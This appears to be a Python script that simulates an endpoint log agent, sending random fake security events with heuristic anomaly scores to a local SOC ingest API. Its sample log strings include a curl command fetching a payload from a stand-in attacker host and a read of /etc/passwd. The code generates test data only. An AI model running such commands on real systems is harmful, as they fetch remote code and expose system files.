import time
import json
import logging
import random
import datetime
import urllib.request
import urllib.error

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] Agent: %(message)s")
log = logging.getLogger("agent")

SOC_ENDPOINT = "http://127.0.0.1:5000/api/log_ingest"

# Simulated log sources 
LOG_PATTERNS = [
    {"type": "NETWORK_CONN", "users": ["system"], "details": ["Outbound connection to 104.16.12.10:443", "Inbound SSH from 192.168.1.100", "DNS query for unknown-domain.xyz"]},
    {"type": "AUTH_ATTEMPT", "users": ["root", "admin", "alice", "guest"], "details": ["Failed password for user", "Accepted publickey", "Session opened for user root", "Invalid user admin from 10.0.0.50"]},
    {"type": "FILE_ACCESS", "users": ["www-data", "root", "alice"], "details": ["Read /etc/passwd", "Modified /var/log/nginx/access.log", "Executing /tmp/script.sh"]},
    {"type": "PROCESS_START", "users": ["root", "postgres", "node"], "details": ["Started process: python3 script.py", "Spawned bash shell", "Executed /usr/bin/curl -s http://evil.com/payload"]}
]

def generate_log():
    pattern = random.choice(LOG_PATTERNS)
    user = random.choice(pattern["users"])
    detail = random.choice(pattern["details"])
    
    # Calculate a simplified heuristic anomaly score
    anomaly_score = 0.1
    if "failed" in detail.lower() or "invalid" in detail.lower() or "/etc/passwd" in detail or "evil.com" in detail:
        anomaly_score = 0.85
    elif "root" in user and "session opened" not in detail.lower():
        anomaly_score = 0.4
        
    log_data = {
        "timestamp": time.time(),
        "type": pattern["type"],
        "user": user,
        "detail": detail,
        "remote_ip": f"{random.randint(10,200)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "anomaly_score": anomaly_score,
        "source": "Windows_Endpoint_Agent"
    }
    return log_data

def send_log(log_data):
    req = urllib.request.Request(
        SOC_ENDPOINT,
        data=json.dumps(log_data).encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "X-API-Key": "sentinel-ingest-key"
        }
    )
    try:
        with urllib.request.urlopen(req, timeout=3) as response:
            if response.status == 200:
                log.info(f"Successfully shipped log: {log_data['type']} by {log_data['user']}")
            else:
                log.warning(f"Failed to ship log. Status: {response.status}")
    except Exception as e:
        log.error(f"Error shipping log: {e}")

def main():
    log.info(f"Starting SentinelOS Log Ingestion Agent...")
    log.info(f"Target SOC Endpoint: {SOC_ENDPOINT}")
    log.info(f"Agent ID: EP-WIN-001")
    
    while True:
        log_data = generate_log()
        send_log(log_data)
        
        # Sleep randomly between 2 and 6 seconds to simulate bursty traffic
        time.sleep(random.uniform(2.0, 6.0))

if __name__ == "__main__":
    main()
